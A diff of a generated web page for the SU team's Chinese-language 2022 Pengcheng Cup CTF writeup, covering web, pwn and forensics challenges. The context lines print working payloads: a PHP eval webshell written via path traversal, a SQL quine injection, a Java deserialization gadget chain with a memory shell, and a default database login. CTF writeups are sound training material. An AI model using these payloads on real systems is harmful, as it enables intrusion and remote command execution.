@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -15,7 +15,8 @@
       <title>2022 鹏城杯 SU Writeup - su-team</title>
 
   <meta name="description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
     "@context": "http://schema.org",
@@ -64,9 +65,9 @@
     "name" : "SUer"
   },
   "headline": "2022 鹏城杯 SU Writeup",
-  "description" : "以下是我们 SU 本次2022 鹏城杯 的 writeup 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)\n",
+  "description" : "以下是我们 SU 本次2022 鹏城杯 的 writeup 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 或直接联系书鱼(QQ:381382770)\n",
   "inLanguage" : "en",
-  "wordCount":  3748 ,
+  "wordCount":  3750 ,
   "datePublished" : "2022-07-04T17:50:45\u002b08:00",
   "dateModified" : "2022-07-04T17:50:45\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -88,7 +89,8 @@
 
 <meta property="og:title" content="2022 鹏城杯 SU Writeup" />
 <meta property="og:description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/pcb-2022-su-wu/" />
 <meta property="og:type" content="website" />
@@ -96,7 +98,8 @@
 
   <meta name="twitter:title" content="2022 鹏城杯 SU Writeup" />
   <meta name="twitter:description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
   <link href='http://localhost:1313/img/SU.jpg' rel='icon' type='image/x-icon'/>
@@ -319,7 +322,7 @@
     &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;18&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3748&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3750&nbsp;words
   
   
     
@@ -408,7 +411,8 @@
         <section class="article-shell">
           <article role="main" class="blog-post">
             <p>以下是我们 SU 本次2022 鹏城杯 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>
+或直接联系书鱼(QQ:381382770)</p>
 <h2 id="pwn">pwn</h2>
 <h3 id="rainbowcat">rainbowcat</h3>
 <p><strong>hijack tcache struct + largebin attack + house of pig + orw</strong>`</p>
@@ -960,13 +964,33 @@
 </span></span></code></pre></div><p>拿到base64的php文件 解码就有</p>
 <h3 id="简单php">简单php</h3>
 <p>只能无参数执行，那么利用url取反加二维数组绕过,使用end(getallheaders())来取命令去执行</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image1.png" alt=""></p>
-<p><img src="/img/2022-pcb-SU-Writeup/image2.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image1.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/pcb-2022-su-wu/image2.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h3 id="ez_java">Ez_java</h3>
 <p>存在反序列化黑名单</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image3.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image3.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>但是存在cb依赖</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image4.png" alt="1"></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image4.png"
+  alt="1"
+  loading="lazy"
+>
+</p>
 <p>可以尝试调用SignedObject的getobject二次反序列化</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">final</span> <span class="ne">Object</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="n">createTemplatesImpl</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">mock</span> <span class="n">method</span> <span class="n">name</span> <span class="n">until</span> <span class="n">armed</span>
@@ -1017,15 +1041,30 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">queue</span><span class="p">;</span>
 </span></span></code></pre></div><p>再使用https://github.com/Y4er/ysoserial 打内存马直接命令执行获取flag</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image5.png" alt=""></p>
-<p><img src="/img/2022-pcb-SU-Writeup/image6.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image5.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/pcb-2022-su-wu/image6.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>PCL{870bf708ae428c5da3191e69b4badf6a}</p>
 <h3 id="can_u_login">can_u_login</h3>
 <p>这里是一quine注入，要求输入和输出一样才行</p>
 <p>参考2021的第五空间https://www.cnblogs.com/kingbridge/articles/15818673.html</p>
 <p>这里构造payload&rsquo;/<strong>/union/</strong>/select(REPLACE(REPLACE(&rsquo;&quot;/<strong>/union/</strong>/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))%23&rsquo;,CHAR(34),CHAR(39)),CHAR(33),&rsquo;&quot;/<strong>/union/</strong>/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))%23&rsquo;))%23</p>
 <p>入让输入和输出一样</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image7.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image7.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>绕过验证获取flag   PCL{7a7a24ec-9dc5-434e-b30c-92fe2df7d626}</p>
 <h3 id="高手高手高高手">高手高手高高手</h3>
 <p>dirsearch 扫描发现 .git 利用 githacker 下载源码</p>
@@ -1150,36 +1189,83 @@
 </span></span><span class="line"><span class="cl"><span class="n">PCL</span><span class="p">{</span><span class="mi">3</span><span class="n">a5eecXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="p">}</span>
 </span></span></code></pre></div><h3 id="easygo">easygo</h3>
 <p>下载附件 根据 gomod 检查到 github 仓库</p>
-<p><a href="https://github.com/KaanSK/golang-sqli-challenge">https://github.com/KaanSK/golang-sqli-challenge</a></p>
+<p><a href="https://github.com/KaanSK/golang-sqli-challenge">https://github.com/KaanSK/golang-sqli-challenge</a>
+</p>
 <p>然后访问 发现 solution</p>
 <p>PostgreSQL 注入 在 juice 下</p>
 <p>通过 solution 或者sqlmap 就可以获取到flag 在 select flag from super_secret_table 下</p>
 <h3 id="easysql">easysql</h3>
 <p>dirsearch 扫描发现phpmyadmin，口令root，password到了后台</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image8.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image8.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>挨个登陆 发现其中一个有flag User=SuperF1@g&amp;Pass=F1@g_1N_Th1S_UsEr_Y0u_Ge7_P@ssW0rd!!!</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image9.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image9.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h3 id="压缩包">压缩包</h3>
 <p>解法1：</p>
 <p>制作一个多文件的压缩包如下图：</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image10.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image10.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>将压缩包base64编码后通过content参数发包</p>
 <p>通过条件竞争去访问xxada.php</p>
-<p><a href="http://192.168.1.113/static/upload/b712fd7be07efcb74ee5a9a9e5eb6ceb/xxxada.php">http://192.168.1.113</a>:8521/static/upload/1b4fd24ada6be9d55e67a6f8ab55c0c9/xxada.php</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image11.png" alt=""></p>
+<p><a href="http://192.168.1.113/static/upload/b712fd7be07efcb74ee5a9a9e5eb6ceb/xxxada.php">http://192.168.1.113</a>
+:8521/static/upload/1b4fd24ada6be9d55e67a6f8ab55c0c9/xxada.php</p>
+<p><img
+  src="/post/pcb-2022-su-wu/image11.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>通过puts跨目录写shell到static/upload/下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php fputs(fopen(&#39;../shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#34;cmd&#34;])?&#39;);?&gt;
 </span></span></code></pre></div><p>http://192.168.1.110:8521/static/upload/shell.php</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image12.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image12.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>解法2：</p>
 <p>构造一个畸形的压缩包或者解压到一半损坏的压缩包即可。</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image13.png" alt=""></p>
-<p><img src="/img/2022-pcb-SU-Writeup/image14.png" alt=""></p>
-<p><img src="/img/2022-pcb-SU-Writeup/image15.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image13.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/pcb-2022-su-wu/image14.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/pcb-2022-su-wu/image15.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h2 id="misc">misc</h2>
 <h3 id="简单取证">简单取证</h3>
 <p>filescan发现secret.jpg</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image16.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image16.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>下载之后打开发现是base64编码,解码之后发现是倒置的zip</p>
 <p>简单处理下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=open(&#39;1.zip&#39;,&#39;rb&#39;)
@@ -1187,21 +1273,51 @@
 </span></span><span class="line"><span class="cl">c=open(&#39;2.zip&#39;,&#39;wb&#39;)
 </span></span><span class="line"><span class="cl">c.write(b)
 </span></span></code></pre></div><p>发现要密码,最后在cmdscan里面发现密码</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image17.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image17.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>得到flag.txt,发现是每行是一个点的坐标</p>
 <p>使用gnuplot画图</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image18.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image18.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>扫码得到flag</p>
 <h3 id="misc_water">Misc_water</h3>
 <p>发现给出的png文件结尾还有多余数据,很容易发现是一个jpg数据的倒置与一个png文件</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image19.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image19.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>简单的提取处理一下,得到三张图片</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image20.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image20.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>根据题目名称water,猜测是盲水印</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image21.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image21.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>得到压缩包密码:ZC4#QaWbW</p>
 <p>得到一张奇怪的图片,010打开发现crc报错,而且根据图片内容很容易发现是高宽被修改</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image22.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image22.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>因此开始爆破png宽高,得到flag</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import zlib
 </span></span><span class="line"><span class="cl">import struct
@@ -1228,9 +1344,19 @@
 </span></span><span class="line"><span class="cl">                print(height, end = &#39; &#39;)
 </span></span><span class="line"><span class="cl">                print(int.from_bytes(height, byteorder=&#39;big&#39;))
 </span></span><span class="line"><span class="cl">                break 
-</span></span></code></pre></div><p><img src="/img/2022-pcb-SU-Writeup/image23.png" alt=""></p>
+</span></span></code></pre></div><p><img
+  src="/post/pcb-2022-su-wu/image23.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>修改高宽后得到flag</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image24.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image24.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h3 id="what_is_log">what_is_log</h3>
 <p>文件是scap后缀，搜了一下可以用sysdig去分析</p>
 <p>看题目描述：某机器的mysql中存在一些秘密，通过log文件你能找到它输入的密码或者这个秘密吗(添加PCL格式提交)</p>
@@ -1238,18 +1364,43 @@
 <p>这里用sysdir把记录导出成txt分析</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysdig -r flag2.scap &gt; 1.txt
 </span></span></code></pre></div><p>在vscode里面翻了一下，大概翻到了个查询表的结构</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image25.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image25.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>搜索这种表的特征，找到了一串数据，且带有seccess，符合题目语境</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image26.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image26.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>PCL{1555a651a13ec074ce725383214fd7cc}</p>
 <h3 id="babybit">babybit</h3>
 <p>首先用OSFMount挂载镜像，然后用DiskGenius打开G盘：</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image27.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image27.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>把zip文件导出来，其实里边就是注册表的备份文件:</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image28.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image28.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>用Register Explorer导入注册表备份文件，bitlocker的加密开始时间位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptInit，加密结束时间则位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptComplete。</p>
 <p>这里应该说是时间戳，把时间戳转为正常的date格式：</p>
-<p><img src="/img/2022-pcb-SU-Writeup/image29.png" alt=""></p>
+<p><img
+  src="/post/pcb-2022-su-wu/image29.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import datetime
 </span></span><span class="line"><span class="cl">timestamp = 132995782594427750 #132995786261823536
 </span></span><span class="line"><span class="cl">value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ### combine str 3 and 4
